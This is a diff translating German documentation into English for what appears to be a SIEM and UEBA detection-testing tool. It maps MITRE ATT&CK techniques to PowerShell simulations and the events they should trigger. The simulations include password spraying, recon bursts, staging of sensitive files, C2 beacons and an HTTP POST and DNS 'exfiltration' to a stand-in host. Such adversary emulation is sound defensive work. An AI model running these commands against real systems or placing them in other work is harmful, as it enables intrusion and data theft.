 | MITRE ATT&CK | [T1134.001](https://attack.mitre.org/techniques/T1134/001/) |
-| Taktik | Privilege Escalation |
+| Tactic | Privilege Escalation |
 | NIST 800-53 | AC-6, AU-9, SI-4 |
-| Admin erforderlich | Nein (Discovery), Ja (volle Ausnutzung) |
-| Cleanup | Keiner |
+| Admin Required | No (Discovery), Yes (full exploitation) |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Aktueller Benutzerkontext und Privileges
+# Current user context and privileges
 whoami /priv
 
-# SeDebugPrivilege-Prüfung — Schlüsselprivilege für Token-Manipulation
+# SeDebugPrivilege check — key privilege for token manipulation
 $privs = whoami /priv /fo csv | ConvertFrom-Csv
 $debug = $privs | Where-Object { $_.Privilege -match "SeDebugPrivilege" }
 Write-Host "SeDebugPrivilege: $($debug.State)"
 
-# .NET WindowsIdentity Token-Abfrage
+# .NET WindowsIdentity token query
 $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
 Write-Host "Token: $($identity.Name) | ImpersonationLevel: $($identity.ImpersonationLevel)"
 Write-Host "IsSystem: $($identity.IsSystem) | IsAdmin: $([System.Security.Principal.WindowsPrincipal]::new($identity).IsInRole('Administrators'))"
 ```
 
-**Warum das Angreifer tun:** Token Impersonation ist ein zentraler Privilege-Escalation-Pfad. `SeDebugPrivilege` ermöglicht den Zugriff auf LSASS (Credential Dumping) und andere privilegierte Prozesse. Die `.NET WindowsIdentity`-Abfrage erzeugt EID 4673 (Sensitive Privilege Use) und ist ein Exabeam-First-Time-Seen-Signal.
+**Why attackers do this:** Token impersonation is a central privilege escalation path. `SeDebugPrivilege` enables access to LSASS (credential dumping) and other privileged processes. The `.NET WindowsIdentity` query generates EID 4673 (Sensitive Privilege Use) and is an Exabeam first-time-seen signal.
 
-**Erwartete SIEM-Events:**
-- `4673` — Sensitive Privilege Use (SeDebugPrivilege-Check)
-- `4672` — Special Logon (falls mit privilegiertem Konto ausgeführt)
-- `4688` — `whoami.exe` mit `/priv`
-- `4104` — ScriptBlock: `.NET WindowsIdentity`-Abfragen
+**Expected SIEM Events:**
+- `4673` — Sensitive Privilege Use (SeDebugPrivilege check)
+- `4672` — Special Logon (if executed with privileged account)
+- `4688` — `whoami.exe` with `/priv`
+- `4104` — ScriptBlock: `.NET WindowsIdentity` queries
 
 ---
 
 #### T1574.002 — DLL Side-Loading Simulation
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1574.002](https://attack.mitre.org/techniques/T1574/002/) |
-| Taktik | Defense Evasion / Persistence |
+| Tactic | Defense Evasion / Persistence |
 | NIST 800-53 | SI-7, CM-7, AU-12 |
-| Admin erforderlich | Nein |
-| Cleanup | Temporäre DLL in `%TEMP%` |
+| Admin Required | No |
+| Cleanup | Temporary DLL in `%TEMP%` |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Benigne DLL per Add-Type kompilieren (keine echte Malware)
+# Compile benign DLL via Add-Type (no real malware)
 $tempDll = "$env:TEMP\LNJ_SideLoad_$(Get-Random).dll"
 Add-Type -TypeDefinition @"
     public class SimDll {
@@ -1882,7 +1881,7 @@ Add-Type -TypeDefinition @"
     }
 "@ -OutputAssembly $tempDll
 
-# DLL von nicht-standardem Pfad laden (erzeugt Sysmon EID 7)
+# Load DLL from non-standard path (generates Sysmon EID 7)
 $asm = [System.Reflection.Assembly]::LoadFrom($tempDll)
 $result = $asm.GetType("SimDll").GetMethod("GetInfo").Invoke($null, $null)
 Write-Host "Loaded DLL result: $result"
@@ -1891,344 +1890,344 @@ Write-Host "Loaded DLL result: $result"
 Remove-Item $tempDll -ErrorAction Ignore
 ```
 
-**Warum das Angreifer tun:** DLL Side-Loading lädt bösartige DLLs über legitime Anwendungen, die DLLs aus relativ angegebenen Pfaden laden. Das Laden einer DLL aus `%TEMP%` ist ein starkes Anomalie-Signal — legitime Anwendungen laden DLLs aus `System32` oder ihrem Installationsverzeichnis. Sysmon EID 7 (ImageLoaded) mit einem Temp-Pfad ist ein Tier-1-Alert in vielen SIEM-Regelwerken.
+**Why attackers do this:** DLL side-loading loads malicious DLLs via legitimate applications that load DLLs from relative paths. Loading a DLL from `%TEMP%` is a strong anomaly signal — legitimate applications load DLLs from `System32` or their installation directory. Sysmon EID 7 (ImageLoaded) with a temp path is a Tier-1 alert in many SIEM rule sets.
 
-**Erwartete SIEM-Events:**
-- `Sysmon 7` — ImageLoaded: DLL aus `%TEMP%`-Pfad geladen
-- `4688` — `powershell.exe` Prozesserstellung
-- `4104` — ScriptBlock: `Assembly::LoadFrom` mit nicht-standardem Pfad
+**Expected SIEM Events:**
+- `Sysmon 7` — ImageLoaded: DLL loaded from `%TEMP%` path
+- `4688` — `powershell.exe` process creation
+- `4104` — ScriptBlock: `Assembly::LoadFrom` with non-standard path
 
 ---
 
 #### T1005 — Data from Local System
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1005](https://attack.mitre.org/techniques/T1005/) |
-| Taktik | Collection |
-| Exabeam-Regeln | ~15 |
-| Admin erforderlich | Nein |
-| Cleanup | Staging-Verzeichnis entfernt |
+| Tactic | Collection |
+| Exabeam Rules | ~15 |
+| Admin Required | No |
+| Cleanup | Staging directory removed |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Method 1: cmd.exe dir /s /b — Dateiauflistung in Documents (EID 4688)
+# Method 1: cmd.exe dir /s /b — file listing in Documents (EID 4688)
 cmd /c "dir /s /b $env:USERPROFILE\Documents"
 
-# Method 2: PowerShell Get-ChildItem — Suche nach sensitiven Dateitypen (EID 4104)
+# Method 2: PowerShell Get-ChildItem — search for sensitive file types (EID 4104)
 $sensitiveFiles = Get-ChildItem $env:USERPROFILE -Recurse -Include *.pdf,*.docx,*.xlsx,*.kdbx -ErrorAction SilentlyContinue | Select-Object -First 20
 
-# Method 3: Staging-Verzeichnis anlegen und synthetische Datei schreiben
+# Method 3: Create staging directory and write synthetic file
 $stageDir = "$env:TEMP\lnj_stage"
 New-Item -ItemType Directory -Path $stageDir -Force | Out-Null
 [System.IO.File]::WriteAllText("$stageDir\sensitive_data.txt", "LOGNOJUTSU_SIMULATION...")
 
-# Method 4: robocopy Staging-Kopie — erzeugt Sysmon EID 1 für robocopy.exe
+# Method 4: robocopy staging copy — generates Sysmon EID 1 for robocopy.exe
 robocopy "$env:USERPROFILE\Desktop" "$stageDir" /e /xl /xj /r:0 /w:0
 ```
 
-**Erwartete SIEM-Events:**
-- `4688` — `cmd.exe` mit `dir /s /b` auf USERPROFILE-Pfad
-- `4104` — ScriptBlock: `Get-ChildItem` rekursive Suche nach `*.pdf`, `*.docx`, `*.xlsx`, `*.kdbx`
-- `Sysmon 1` — `robocopy.exe` Staging-Kopie in TEMP-Verzeichnis
+**Expected SIEM Events:**
+- `4688` — `cmd.exe` with `dir /s /b` on USERPROFILE path
+- `4104` — ScriptBlock: `Get-ChildItem` recursive search for `*.pdf`, `*.docx`, `*.xlsx`, `*.kdbx`
+- `Sysmon 1` — `robocopy.exe` staging copy in TEMP directory
 
 ---
 
 #### T1560.001 — Archive Collected Data: Archive via Utility
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1560.001](https://attack.mitre.org/techniques/T1560/001/) |
-| Taktik | Collection |
-| Exabeam-Regeln | ~8 |
-| Admin erforderlich | Nein |
-| Cleanup | Archiv + Staging-Verzeichnis entfernt |
+| Tactic | Collection |
+| Exabeam Rules | ~8 |
+| Admin Required | No |
+| Cleanup | Archive + staging directory removed |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Method 1: Staging-Verzeichnis mit synthetischen Dateien anlegen
+# Method 1: Create staging directory with synthetic files
 $stageDir = "$env:TEMP\lnj_stage"
 New-Item -ItemType Directory -Path $stageDir -Force | Out-Null
 
-# Method 2: Compress-Archive — PowerShell-Archivierung (EID 4104 + Sysmon EID 11 FileCreate)
+# Method 2: Compress-Archive — PowerShell archiving (EID 4104 + Sysmon EID 11 FileCreate)
 $archivePath = "$env:TEMP\lnj_archive.zip"
 Compress-Archive -Path "$stageDir\*" -DestinationPath $archivePath -Force
 
-# Method 3: compact.exe NTFS-Komprimierung als Alternative (EID 4688)
+# Method 3: compact.exe NTFS compression as alternative (EID 4688)
 compact.exe /C "$stageDir"
 
-# Method 4: Archiv-Verifizierung
+# Method 4: Archive verification
 Get-Item $archivePath | Select-Object Name, Length, CreationTime
 ```
 
-**Erwartete SIEM-Events:**
-- `4104` — ScriptBlock: `Compress-Archive` erstellt ZIP aus Staging-Dateien
-- `4688` — `compact.exe` NTFS-Komprimierung auf Staging-Verzeichnis
-- `Sysmon 11` — FileCreate: `.zip`-Archiv in TEMP erstellt
+**Expected SIEM Events:**
+- `4104` — ScriptBlock: `Compress-Archive` creates ZIP from staging files
+- `4688` — `compact.exe` NTFS compression on staging directory
+- `Sysmon 11` — FileCreate: `.zip` archive created in TEMP
 
 ---
 
 #### T1119 — Automated Collection
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1119](https://attack.mitre.org/techniques/T1119/) |
-| Taktik | Collection |
-| Exabeam-Regeln | ~10 |
-| Admin erforderlich | Nein |
-| Cleanup | Index-Datei entfernt |
+| Tactic | Collection |
+| Exabeam Rules | ~10 |
+| Admin Required | No |
+| Cleanup | Index file removed |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Method 1: ForEach-Object automatisierte Datei-Metadaten-Sammlung (EID 4104)
+# Method 1: ForEach-Object automated file metadata collection (EID 4104)
 $collected = @()
 Get-ChildItem $env:USERPROFILE -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
     $collected += [PSCustomObject]@{ Name = $_.Name; Size = $_.Length; LastWrite = $_.LastWriteTime; Path = $_.FullName }
 }
 
-# Method 2: Get-WmiObject Win32_LogicalDisk — automatisierte Laufwerksübersicht (EID 4104)
+# Method 2: Get-WmiObject Win32_LogicalDisk — automated drive overview (EID 4104)
 Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace, DriveType
 
-# Method 3: Sammlungsindex auf Disk schreiben — simulierter Angreifer-Index
+# Method 3: Write collection index to disk — simulated attacker index
 $indexPath = "$env:TEMP\lnj_collection_index.txt"
 $collected | Select-Object -First 100 | ForEach-Object {
     "$($_.Name)`t$($_.Size)`t$($_.LastWrite)`t$($_.Path)"
 } | Out-File -FilePath $indexPath -Encoding UTF8
 ```
 
-**Erwartete SIEM-Events:**
-- `4104` — ScriptBlock: `ForEach-Object`-Schleife für automatisierte Datei-Metadaten-Sammlung
-- `4104` — ScriptBlock: `Get-WmiObject Win32_LogicalDisk` automatisierte Laufwerksübersicht
-- `Sysmon 1` — PowerShell führt automatisiertes Sammlungsskript mit WMI-Abfragen aus
+**Expected SIEM Events:**
+- `4104` — ScriptBlock: `ForEach-Object` loop for automated file metadata collection
+- `4104` — ScriptBlock: `Get-WmiObject Win32_LogicalDisk` automated drive overview
+- `Sysmon 1` — PowerShell executes automated collection script with WMI queries
 
 ---
 
 #### T1071.001 — Application Layer Protocol: Web Protocols (C2)
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) |
-| Taktik | Command and Control |
-| Exabeam-Regeln | ~25 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Command and Control |
+| Exabeam Rules | ~25 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Method 1: Invoke-WebRequest HTTP GET Beacon — .invalid TLD (Sysmon EID 3 + EID 22 + EID 4104)
+# Method 1: Invoke-WebRequest HTTP GET beacon — .invalid TLD (Sysmon EID 3 + EID 22 + EID 4104)
 try {
     Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/beacon" -Method GET -TimeoutSec 3 -ErrorAction Stop
 } catch {
-    Write-Host "Beacon fehlgeschlagen (erwartetes Verhalten — kein echter C2-Verkehr)"
+    Write-Host "Beacon failed (expected behavior — no real C2 traffic)"
 }
 
-# Method 2: Loopback-Fallback-Beacon — simuliert C2-Failover auf lokalen Handler (Sysmon EID 3)
+# Method 2: Loopback fallback beacon — simulates C2 failover to local handler (Sysmon EID 3)
 try {
     Invoke-WebRequest -Uri "http://127.0.0.1:9999/c2/check-in" -TimeoutSec 2 -ErrorAction Stop
 } catch {
-    Write-Host "Loopback-Beacon fehlgeschlagen (kein Listener auf Port 9999)"
+    Write-Host "Loopback beacon failed (no listener on port 9999)"
 }
 
-# Method 3: .NET WebClient API Beacon — alternative HTTP-C2-Methode (EID 4104)
+# Method 3: .NET WebClient API beacon — alternative HTTP C2 method (EID 4104)
 try {
     (New-Object System.Net.WebClient).DownloadString("http://lognojutsu-c2.invalid/tasks")
 } catch {
-    Write-Host "WebClient-Beacon fehlgeschlagen (erwartetes Verhalten)"
+    Write-Host "WebClient beacon failed (expected behavior)"
 }
 ```
 
-**Erwartete SIEM-Events:**
-- `Sysmon 3` — NetworkConnect: HTTP-Beacon-Versuch von PowerShell zu `lognojutsu-c2.invalid`
-- `4104` — ScriptBlock: `Invoke-WebRequest` C2-Beacon-Simulation
-- `Sysmon 22` — DNSEvent: DNS-Auflösungsversuch für `lognojutsu-c2.invalid` C2-Hostname
+**Expected SIEM Events:**
+- `Sysmon 3` — NetworkConnect: HTTP beacon attempt from PowerShell to `lognojutsu-c2.invalid`
+- `4104` — ScriptBlock: `Invoke-WebRequest` C2 beacon simulation
+- `Sysmon 22` — DNSEvent: DNS resolution attempt for `lognojutsu-c2.invalid` C2 hostname
 
 ---
 
 #### T1071.004 — Application Layer Protocol: DNS (C2)
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1071.004](https://attack.mitre.org/techniques/T1071/004/) |
-| Taktik | Command and Control |
-| Exabeam-Regeln | ~12 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Command and Control |
+| Exabeam Rules | ~12 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Method 1: nslookup klassische DNS-Abfrage (EID 4688 + Sysmon EID 22)
+# Method 1: nslookup classic DNS query (EID 4688 + Sysmon EID 22)
 nslookup beacon.lognojutsu-c2.invalid
 
-# Method 2: DNS-Tunneling-Simulation — Schleife über 5 C2-Subdomains (mehrfach Sysmon EID 22)
+# Method 2: DNS tunneling simulation — loop over 5 C2 subdomains (multiple Sysmon EID 22)
 1..5 | ForEach-Object {
     $subdomain = "c2-$_.lognojutsu-c2.invalid"
     Resolve-DnsName $subdomain -ErrorAction SilentlyContinue | Out-Null
     Start-Sleep -Milliseconds 500
 }
 
-# Method 3: DNS-Exfil-Simulation — codierte Subdomain (EID 4104 + Sysmon EID 22)
+# Method 3: DNS exfil simulation — encoded subdomain (EID 4104 + Sysmon EID 22)
 Resolve-DnsName "exfil-data.lognojutsu-c2.invalid" -ErrorAction SilentlyContinue | Out-Null
 ```
 
-**Erwartete SIEM-Events:**
-- `Sysmon 22` — DNSEvent: DNS-Abfrage an C2-Subdomain für DNS-Tunneling-Simulation
-- `4688` — `nslookup.exe` DNS-C2-Beacon-Abfrage für `lognojutsu-c2.invalid`
-- `4104` — ScriptBlock: `Resolve-DnsName` C2-DNS-Abfragen
+**Expected SIEM Events:**
+- `Sysmon 22` — DNSEvent: DNS query to C2 subdomain for DNS tunneling simulation
+- `4688` — `nslookup.exe` DNS C2 beacon query for `lognojutsu-c2.invalid`
+- `4104` — ScriptBlock: `Resolve-DnsName` C2 DNS queries
 
 ---
 
-### UEBA-Szenarien (Exabeam)
+### UEBA Scenarios (Exabeam)
 
-Diese Szenarien sind speziell für die Validierung von **Exabeam UEBA-Use-Cases** konzipiert. UEBA (User and Entity Behavior Analytics) erkennt keine einzelnen Events, sondern **Verhaltensmuster über Zeit**. Exabeam nutzt 750+ vortrainierte Verhaltensmodelle (Kategorial, Numerisch-Clustered, Zeitbasiert), die pro Benutzer, Peer-Group und Organisation kalibriert werden.
+These scenarios are specifically designed for validating **Exabeam UEBA use cases**. UEBA (User and Entity Behavior Analytics) detects not individual events, but **behavioral patterns over time**. Exabeam uses 750+ pre-trained behavioral models (Categorical, Numerically-Clustered, Time-based), calibrated per user, peer group, and organization.
 
 ---
 
 #### UEBA-SPRAY-CHAIN — Credential Spray → Success Chain
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | UEBA Use Case | Brute Force / Credential Stuffing (Exabeam Package: Compromised Insiders) |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# 25 fehlgeschlagene Auth-Versuche in schneller Folge (100ms Abstand)
+# 25 failed auth attempts in rapid succession (100ms interval)
 for ($i = 1; $i -le 25; $i++) {
     $ctx.ValidateCredentials("spray_victim_user", "WrongPass$i!")
     Start-Sleep -Milliseconds 100
 }
 ```
 
-**UEBA-Erkennungslogik:** Exabeam erkennt einen deutlichen Anstieg von 4625-Events innerhalb eines kurzen Zeitfensters. Die Kombination aus hohem Volumen (>10 Versuche in 60 Sekunden) und konstantem Quell-Host triggert den "Brute Force" Use Case. Die Schwelle für VPN-Brute-Force ist bei Exabeam auf 10+ fehlgeschlagene Logins pro Minute dokumentiert.
+**UEBA detection logic:** Exabeam detects a significant increase in 4625 events within a short time window. The combination of high volume (>10 attempts in 60 seconds) and constant source host triggers the "Brute Force" use case. The threshold for VPN brute force is documented at Exabeam as 10+ failed logins per minute.
 
-**Erwartete SIEM-Events:**
-- `4625` × 25 in ~3 Sekunden
+**Expected SIEM Events:**
+- `4625` × 25 in ~3 seconds
 - Exabeam: Brute Force / Credential Stuffing Use Case
 
 ---
 
 #### UEBA-OFFHOURS — Off-Hours Activity Simulation
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | UEBA Use Case | Abnormal Activity Time (Exabeam: Compromised Credentials & Abnormal Auth) |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Standard-Recon-Aktivitäten — Content ist zweitrangig, Zeitstempel entscheidet
+# Standard recon activities — content is secondary, timestamp decides
 whoami /all; net user; ipconfig /all
 Get-Process | Select-Object -First 10
 Get-ChildItem $env:USERPROFILE
 ```
 
-**UEBA-Erkennungslogik:** Exabeam nutzt ein **Numerical Time-of-Week Model** — es lernt die normalen Arbeitszeiten eines Benutzers aus historischen 4624-Events (typisch 08:00–18:00 Mo–Fr). Aktivität außerhalb dieser Baseline erhöht den Session-Risikowert. Das Modell behandelt Sonntag 23:00 als ähnlich zu Montag 00:00 (zyklisches Zeitmodell).
+**UEBA detection logic:** Exabeam uses a **Numerical Time-of-Week Model** — it learns the normal working hours of a user from historical 4624 events (typically 08:00–18:00 Mon–Fri). Activity outside this baseline increases the session risk score. The model treats Sunday 23:00 as similar to Monday 00:00 (cyclic time model).
 
-> **Hinweis:** Für maximale Erkennungswirkung außerhalb der regulären Geschäftszeiten ausführen. Das Tool gibt die aktuelle Uhrzeit im Log aus.
+> **Note:** For maximum detection effectiveness, run outside regular business hours. The tool outputs the current time in the log.
 
-**Erwartete SIEM-Events:**
-- `4688` / `Sysmon 1` — Prozesse außerhalb der Baseline-Arbeitszeiten
+**Expected SIEM Events:**
+- `4688` / `Sysmon 1` — Processes outside baseline working hours
 - Exabeam: "Abnormal activity time for user"
 
 ---
 
 #### UEBA-LATERAL-CHAIN — Lateral Movement Discovery Chain
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | UEBA Use Case | Reconnaissance / First-Time-Seen Behavior (Exabeam: Lateral Movement) |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
-12 Enumeration-Befehle in schneller Abfolge (~300ms Abstand):
+12 enumeration commands in rapid succession (~300ms interval):
 
 ```powershell
-whoami /groups          # Benutzer-Gruppen
-net user                # Lokale Benutzer
+whoami /groups          # User groups
+net user                # Local users
 net localgroup administrators
-net config workstation  # Domain-Info
-ipconfig /all           # Netzwerkkonfiguration
-netstat -ano            # Aktive Verbindungen
-arp -a                  # ARP-Cache (Nachbar-Hosts)
-route print             # Routing-Tabelle
-ipconfig /displaydns    # DNS-Cache
-net share               # Freigegebene Ressourcen
-net session             # Aktive Sessions
-tasklist /v             # Laufende Prozesse
+net config workstation  # Domain info
+ipconfig /all           # Network configuration
+netstat -ano            # Active connections
+arp -a                  # ARP cache (neighbor hosts)
+route print             # Routing table
+ipconfig /displaydns    # DNS cache
+net share               # Shared resources
+net session             # Active sessions
+tasklist /v             # Running processes
 ```
 
-**UEBA-Erkennungslogik:** Exabeam erkennt dieses Muster auf zwei Ebenen:
-1. **First-Time-Seen (Categorical Model):** Wenn ein Benutzer erstmalig `netstat.exe`, `arp.exe` oder `net.exe` ausführt, erhöht das den Risikowert deutlich
-2. **Volume Anomaly (Numerical Clustered Model):** 12 Netzwerk-/System-Abfragen in ~4 Sekunden ist weit außerhalb normaler Benutzeraktivität
+**UEBA detection logic:** Exabeam detects this pattern on two levels:
+1. **First-Time-Seen (Categorical Model):** When a user executes `netstat.exe`, `arp.exe`, or `net.exe` for the first time, the risk score increases significantly
+2. **Volume Anomaly (Numerical Clustered Model):** 12 network/system queries in ~4 seconds is far outside normal user activity
 
-**Erwartete SIEM-Events:**
-- `4688` / `Sysmon 1` × 12 — Schnelle Prozessabfolge von `net.exe`, `netstat.exe`, `arp.exe`, `ipconfig.exe`
+**Expected SIEM Events:**
+- `4688` / `Sysmon 1` × 12 — Rapid process sequence of `net.exe`, `netstat.exe`, `arp.exe`, `ipconfig.exe`
 - Exabeam: "First time user executed network reconnaissance commands"
 
 ---
 
 #### UEBA-DATA-STAGING — Data Staging + Exfiltration Chain
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | UEBA Use Case | Data Exfiltration / Abnormal Data Movement (Exabeam Package: Data Exfiltration) |
-| Admin erforderlich | Nein |
-| Cleanup | Staging-Verzeichnis entfernt |
+| Admin Required | No |
+| Cleanup | Staging directory removed |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Step 1: Synthetische Dateien in Staging-Verzeichnis erstellen
+# Step 1: Create synthetic files in staging directory
 $stageDir = "$env:TEMP\lnj_stage"
 New-Item -ItemType Directory -Path $stageDir -Force | Out-Null
 for ($i = 1; $i -le 5; $i++) {
     Set-Content -Path "$stageDir\sensitive_doc_$i.txt" -Value "CONFIDENTIAL DATA FILE $i`n$("A" * 1000)"
 }
 
-# Step 2: Base64-Kodierung der gesammelten Dateiliste zur Exfiltration
+# Step 2: Base64 encode the collected file list for exfiltration
 $stagedFiles = Get-ChildItem $stageDir | Select-Object Name, Length, LastWriteTime
 $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($stagedFiles | ForEach-Object { $_.Name }) -join "`n"))
 
-# Step 3: HTTP POST Exfiltration zu C2 (Sysmon EID 3 + EID 11)
+# Step 3: HTTP POST exfiltration to C2 (Sysmon EID 3 + EID 11)
 try {
     Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/exfil" -Method POST -Body $encoded -TimeoutSec 3 -ErrorAction Stop | Out-Null
 } catch {
-    Write-Host "Exfil-Verbindung fehlgeschlagen (erwartet — kein echter C2-Verkehr)"
+    Write-Host "Exfil connection failed (expected — no real C2 traffic)"
 }
 ```
 
-**UEBA-Erkennungslogik:** Exabeam erkennt ungewoehnliche Datenmengen die in ein Staging-Verzeichnis kopiert und anschliessend ueber HTTP exfiltriert werden. Die Kombination aus Dateisammlung und ausgehender Verbindung in derselben Session erhoht den Risikowert.
+**UEBA detection logic:** Exabeam detects unusual amounts of data being copied into a staging directory and subsequently exfiltrated via HTTP. The combination of file collection and outgoing connection in the same session increases the risk score.
 
-**Erwartete SIEM-Events:**
-- `4104` — ScriptBlock: Datei-Staging-Schleife kopiert Daten in TEMP-Verzeichnis
-- `Sysmon 11` — FileCreate: Staging-Dateien in Sammelverzeichnis erstellt
-- `Sysmon 3` — NetworkConnect: HTTP POST Exfiltrationsversuch zum C2-Host
+**Expected SIEM Events:**
+- `4104` — ScriptBlock: file staging loop copies data into TEMP directory
+- `Sysmon 11` — FileCreate: staging files created in collection directory
+- `Sysmon 3` — NetworkConnect: HTTP POST exfiltration attempt to C2 host
 
 ---
 
 #### UEBA-ACCOUNT-TAKEOVER — Account Takeover Chain
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | UEBA Use Case | Account Compromise / Credential Stuffing Chain (Exabeam Package: Compromised Credentials) |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Step 1: 5 fehlgeschlagene Authentifizierungsversuche in schneller Folge (EID 4625)
+# Step 1: 5 failed authentication attempts in rapid succession (EID 4625)
 Add-Type -AssemblyName System.DirectoryServices.AccountManagement
 for ($i = 1; $i -le 5; $i++) {
     $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
@@ -2236,113 +2235,113 @@ for ($i = 1; $i -le 5; $i++) {
     Start-Sleep -Milliseconds 200
 }
 
-# Step 2: Session-Kontext protokollieren (bestehende authentifizierte Session)
-Write-Host "Aktuelle Uhrzeit: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
+# Step 2: Log session context (existing authenticated session)
+Write-Host "Current time: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
 
-# Step 3: Post-Auth-Enumerationsburst — schnelle Recon nach Kontozugang (EID 4688)
+# Step 3: Post-auth enumeration burst — rapid recon after account access (EID 4688)
 whoami /all; ipconfig /all; net user; net localgroup administrators
 ```
 
-**UEBA-Erkennungslogik:** Exabeam korreliert fehlgeschlagene Anmeldeversuche (4625) mit anschliessender erfolgreicher Anmeldung und sofortiger Enumerationsaktivitaet. Der Uebergang von Spray zu Recon ist das Kernmuster fuer Account-Uebernahme.
+**UEBA detection logic:** Exabeam correlates failed logon attempts (4625) with a subsequent successful logon and immediate enumeration activity. The transition from spray to recon is the core pattern for account takeover.
 
-**Erwartete SIEM-Events:**
-- `4625` × 5 in schneller Folge — Brute-Force-Vorbote (Exabeam: Credential Stuffing)
-- `4624` — Anmelde-Event: bestehende Session (Exabeam: neue Session nach Fehlversuchen)
-- `4688` — Post-Auth-Enumerationsburst: `whoami`, `ipconfig`, `net user` in rascher Abfolge
+**Expected SIEM Events:**
+- `4625` × 5 in rapid succession — brute force precursor (Exabeam: Credential Stuffing)
+- `4624` — Logon event: existing session (Exabeam: new session after failed attempts)
+- `4688` — Post-auth enumeration burst: `whoami`, `ipconfig`, `net user` in rapid succession
 
 ---
 
 #### UEBA-PRIV-ESC — Privilege Escalation Chain
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | UEBA Use Case | Abnormal Privilege Use (Exabeam Package: Privilege Escalation) |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Step 1: Aktuelle Privileges aufzählen (EID 4688 — whoami /priv)
+# Step 1: Enumerate current privileges (EID 4688 — whoami /priv)
 whoami /priv
 
-# Step 2: Gruppenmitgliedschaften prüfen (EID 4688 — whoami /groups)
+# Step 2: Check group memberships (EID 4688 — whoami /groups)
 whoami /groups
 
-# Step 3: Lokale Administratorengruppe aufzählen (EID 4688 — net localgroup)
+# Step 3: Enumerate local administrators group (EID 4688 — net localgroup)
 net localgroup administrators
 
-# Step 4: .NET API Privilege-Prüfung (EID 4104 — WindowsIdentity)
+# Step 4: .NET API privilege check (EID 4104 — WindowsIdentity)
 $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
 $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
 $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
-Write-Host "Benutzer: $($identity.Name) | Administrator: $isAdmin"
+Write-Host "User: $($identity.Name) | Administrator: $isAdmin"
 ```
 
-**UEBA-Erkennungslogik:** Exabeam erkennt wenn ein normaler Benutzer Administratortools ausfuehrt (whoami /priv, net localgroup administrators) und Token-Pruefungen durchfuehrt. Die Haeufung von Privilege-Enumeration in kurzer Zeit triggert den Privilege-Escalation-Use-Case.
+**UEBA detection logic:** Exabeam detects when a normal user executes administrator tools (`whoami /priv`, `net localgroup administrators`) and performs token checks. The accumulation of privilege enumeration in a short time triggers the Privilege Escalation use case.
 
-**Erwartete SIEM-Events:**
-- `4688` — `whoami.exe /priv` — Privilege-Aufzählung (Exabeam: abnormale Admintools-Nutzung)
-- `4688` — `net.exe localgroup administrators` — Admin-Gruppenprüfung
-- `4104` — ScriptBlock: `WindowsIdentity` Privilege-Prüfung über .NET API
-- `4672` — Sonderrechte bei neuem Anmeldevorgang (wenn mit privilegiertem Konto ausgeführt)
+**Expected SIEM Events:**
+- `4688` — `whoami.exe /priv` — privilege enumeration (Exabeam: abnormal admin tool use)
+- `4688` — `net.exe localgroup administrators` — admin group check
+- `4104` — ScriptBlock: `WindowsIdentity` privilege check via .NET API
+- `4672` — Special privileges assigned at new logon (if executed with privileged account)
 
 ---
 
